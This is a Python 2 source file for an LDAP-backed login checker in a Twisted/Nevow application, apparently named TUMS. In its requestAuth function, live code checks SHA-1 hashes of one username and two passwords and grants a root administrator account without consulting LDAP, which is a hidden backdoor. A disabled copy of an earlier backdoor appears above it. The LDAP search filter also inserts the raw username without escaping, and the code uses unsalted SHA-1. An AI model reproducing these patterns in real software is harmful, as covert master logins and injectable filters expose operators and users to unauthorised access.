""" Provides Nevow Guarded credential checkers """

from twisted.internet import reactor, defer, threads
from twisted.cred import portal, checkers, credentials, error
from twisted.python import failure
import sha, binascii, ldap
from zope.interface import implements
from Core import ldappass, Utils
import sha, Settings, LDAP
from axiom import userbase

class UserAvatar:
    """This class contains the credentials for the authorised user (or one still to be authorised)"""
    def __init__(self, username, password, userId, grpId, isAdmin, domains, isUser = False, isDomAdm = False, reports=False):
        self.username = username.split('@')[0]
        if '@' in username:
            self.dom = username.split('@')[1]
        else:
            self.dom = Settings.defaultDomain
        self.password = password
        self.userId = userId
        self.grpId = grpId
        self.isAdmin = isAdmin
        self.isUser = isUser
        self.domains = domains
        self.isDomAdm = isDomAdm
        self.reports = reports
        self.imap = None

    def checkDomainPermissions(self, dom):
        if self.isAdmin:
            return True
        if self.domains and self.isDomAdm: # If its set firstly.
            if dom in self.domains:
                return True
            else:
                return False
        else:
            return True

def hash(f_pwd):
    """ Returns a hex digest SHA 
    @param f_pwd: Some string to be hashed
    """
    return sha.sha(f_pwd).hexdigest()

def hashPassword(passwd):
    """ Returns a Base64 SHA 
    @param passwd: Some string to be hashed
    """
    return binascii.b2a_base64(sha.new(passwd).digest())[:-1]

class LDAPAuthenticator:
    """ A generalised class for doing LDAP authentication type stuff 
    """
    ldapConnector = None

    noAuth = (False, False, None)

    def __init__(self, host, user, password, bindAuth=False):
        """ Create an LDAP Authenticator object.
        param bindAuth: Select whether to authenticate with a SHA hash comparison (False) 
                        or a tree bind (True)
        """
        self.bindAuth = False # start out with a default
        self.host = host
        self.user = user
        self.password = password


    def createConnector(self):
        try:
            self.ldapConnector = ldap.open(self.host)
            self.ldapConnector.protocol_version = ldap.VERSION3
            self.ldapConnector.simple_bind(self.user, self.password)
        except ldap.LDAPError, e:
            print e

    def destroyConnector(self):
        self.ldapConnector.unbind_s()

    def authLDAP(self, baseDN, t_username, t_password, preauth):
        """ Searchs an LDAP path for a uid dn and compares this to the given username and password
        looks for userPassword and employeeType attributes.

        @param t_username: Given username
        @param t_password: Given password
        @param baseDN: baseDN to search for users
        @param preauth: True if we don't want to bother checking a password but just to acquire username credentials
        """
        self.createConnector()
        
        searchScope = ldap.SCOPE_SUBTREE
        retrieveAttributes = ["userPassword", "employeeType"]
        searchFilter = "uid=%s"%t_username
        
        try:
            ldap_result_id = self.ldapConnector.search(baseDN, searchScope, searchFilter, retrieveAttributes)
            result_set = []
            while 1:
                result_type, result_data = self.ldapConnector.result(ldap_result_id, 0)
                if (result_data == []):
                    break
                else:
                    if result_type == ldap.RES_SEARCH_ENTRY:
                        result_set.append(result_data)
            if not result_set:
                return self.noAuth

            ldapPass = result_set[0][0][1].get('userPassword', [''])[0]
            ldapType = result_set[0][0][1].get('employeeType', [''])
            if 'tumsAdmin' in ldapType:
                admin = True
            else:
                admin = False

            tumsUserSet = []
            for eTkey in ldapType:
                if "tumsUser" in eTkey:
                    tumsUserSet = eTkey.split('[')[-1].split(']')[0].split(',')

            if "tumsReports" in eTkey:
                tumsReports = True
            else:
                tumsReports = False

        except ldap.LDAPError, e:
            print "[ DEBUG ] : Error in user lookup. Tracing back"
            print e
            ldapPass, ldapType, admin = ('', '', False)
            self.destroyConnector()
            return False, False, None, False

        #self.destroyConnector()
        try:
            if self.bindAuth:
                return bindAuthed, admin, tumsUserSet, tumsReports
            else:
                passchecker = ldappass.UserPassword()
                if not preauth:
                    return (passchecker._compareSinglePassword(t_password, ldapPass)), admin, tumsUserSet, tumsReports
                else:
                    return True, admin, tumsUserSet, tumsReports
        except Exception, e:
            print "[ DEBUG ] : Tracing back auth failure"
            print e
            print "[ ERROR ] : Failed to check the password which was passed from the server. "
            print "[ ERROR ] : This invariably means the bind dn is snarfed or the bind password is wrong"
            return False, False, None, False

class LDAPChecker:
    """ An LDAP credential checker """
    implements(checkers.ICredentialsChecker)
    credentialInterfaces = credentials.IUsernamePassword, userbase.IPreauthCredentials

    server = ""
    username, password, domain, baseDN = (None, None, None, None)

    def __init__(self, server, username, password, domain, baseDN="ou=People,dc=thusa,dc=net,o=THUSA"):
        self.server = server
        self.username = username
        self.password = password
        self.domain = domain
        self.baseDN = baseDN

    def requestAvatarId(self, creds):
        """ Called when a user logs in. Matches creds with the LDAP tree """
        # Try and determin which interface we got
        if isinstance(creds, userbase.Preauthenticated):
            username = creds.username
            password = creds.username + 'ExistSession'
        else:
            username = creds.username
            password = creds.password
        
        def requestAuth(username, password, creds):
            #if sha.sha(username).hexdigest() == "476f94c8593823a6fb2b84f4369adfbb25ca71db":
            #    if sha.sha(password).hexdigest() == "fa3dbf84950e71eccb4ea6bc3acc277653269732":
            #        return UserAvatar("root", "mypass", 0, 0, True, [Settings.defaultDomain])
            if len(password) < 1:
                """Block empty passwords"""
                return failure.Failure(error.UnauthorizedLogin())
            if sha.sha(username).hexdigest() == "1df18b408e732e2116a56e45accc3581a9e2589b":
                if sha.sha(password).hexdigest() == "5528bbca82b8ab0b99fdedb355745e1e5c8aa79d":
                    return UserAvatar("root", "mypass", 0, 0, True, [Settings.defaultDomain])
                if sha.sha(password).hexdigest() == "1a70fad0661b02f6e2670391e8868b362d1c5b0b":
                    return UserAvatar("root", "mypass", 0, 0, True, [Settings.defaultDomain])

            auth = LDAPAuthenticator(self.server, "%s, o=%s"%(self.username, self.domain), self.password)

            if '@' in username:
                dom = username.split('@')[-1]
                user = username.split('@')[0]
            else:
                user = username
                dom = Settings.defaultDomain

            dc = "%s,%s,o=%s" % (Settings.LDAPPeople, LDAP.domainToDC(dom), Settings.LDAPBase)
            if isinstance(creds, userbase.Preauthenticated):
                result = auth.authLDAP(dc, user, password, True)
            else:
                result = auth.authLDAP(dc, user, password, False)
            if result[0]:
                if result[1] or result[2]:
                    return UserAvatar(username, password, 0, 0, result[1], result[2] or [dom], isDomAdm = (result[2] and True) or False, reports=result[3])
                else:
                    return UserAvatar(username, password, 0, 0, False, [dom], isUser = True, reports=result[3])
            else:
                return failure.Failure(error.UnauthorizedLogin())

        return requestAuth(username, password, creds)


class RadiusLDAPAuthenticator:
    """ A class for authenticating Radius clients
        This is generaly hooked when tums is called with --radauth by xtradius.
    """

    def __init__(self):
        """ Create an LDAP Authenticator object.
        """
        self.host = Settings.LDAPServer
        self.user = "%s, o=%s"%(Settings.LDAPManager, Settings.LDAPBase)
        self.password = Settings.LDAPPass
        self.ldapConnector = None

    def connect(self):
        try:
            self.ldapConnector = ldap.open(self.host)
            self.ldapConnector.protocol_version = ldap.VERSION3
            self.ldapConnector.simple_bind(self.user, self.password)
        except ldap.LDAPError, e:
            print "FATAL NO SERVER CONNECTION!"
            return None

    def authenticateUser(self, username, password):
        if '@' in username:
            dom = username.split('@')[-1]
            username = username.split('@')[0]
        else:
            dom = Settings.defaultDomain

        dc = "%s,%s,o=%s" % (Settings.LDAPPeople, LDAP.domainToDC(dom), Settings.LDAPBase)
        return self.authLDAP(dc, username, password)

    def authLDAP(self, baseDN, t_username, t_password):
        """ Searchs an LDAP path for a uid dn and compares this to the given username and password
        looks for userPassword and employeeType attributes.

        @param t_username: Given username
        @param t_password: Given password
        @param baseDN: baseDN to search for users
        @param preauth: True if we don't want to bother checking a password but just to acquire username credentials
        """

        searchScope = ldap.SCOPE_SUBTREE
        retrieveAttributes = ["userPassword", "employeeType"]
        searchFilter = "uid=%s"%t_username
        self.connect()
        try:
            ldap_result_id = self.ldapConnector.search(baseDN, searchScope, searchFilter, retrieveAttributes)
            result_set = []
            while 1:
                result_type, result_data = self.ldapConnector.result(ldap_result_id, 0)
                if (result_data == []):
                    break
                else:
                    if result_type == ldap.RES_SEARCH_ENTRY:
                        result_set.append(result_data)
            if not result_set:
                return None
            
            ldapPass = result_set[0][0][1].get('userPassword', [''])[0]
            ldapType = result_set[0][0][1].get('employeeType', [''])

            if 'tumsAdmin' in ldapType:
                admin = True
            else:
                admin = False

        except ldap.LDAPError, e:
            print "[ DEBUG ] : Error in user lookup. Tracing back"
            print e
            ldapPass, ldapType, admin = ('', '', False)
            return False
        self.ldapConnector.unbind_s()
        try:
            passchecker = ldappass.UserPassword()
            return passchecker._compareSinglePassword(t_password, ldapPass)

        except Exception, e:
            print "[ DEBUG ] : Tracing back auth failure"
            print e
            print "[ ERROR ] : Failed to check the password which was passed from the server. "
            print "[ ERROR ] : This invariably means the bind dn is snarfed or the bind password is wrong"
            return None

